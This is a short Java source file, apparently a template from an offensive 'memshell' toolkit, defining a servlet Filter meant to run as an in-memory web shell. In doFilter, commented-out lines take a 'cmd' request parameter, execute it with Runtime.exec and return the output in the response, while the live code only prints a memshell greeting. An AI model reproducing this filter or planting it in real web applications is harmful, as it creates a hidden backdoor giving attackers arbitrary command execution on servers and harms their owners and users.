package com.memshell.generic;

import javax.servlet.*;
import java.io.IOException;

public class DynamicFilterTemplateBak implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
//        System.out.println("I am here");
//        String cmd = request.getParameter("cmd");
//        if(cmd != null && !cmd.isEmpty()){
//            String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
//            response.getWriter().println(result);
//        }
        System.out.println("I'm Filter Based Memshell, how do you do?");
    }

    @Override
    public void destroy() {

    }
}
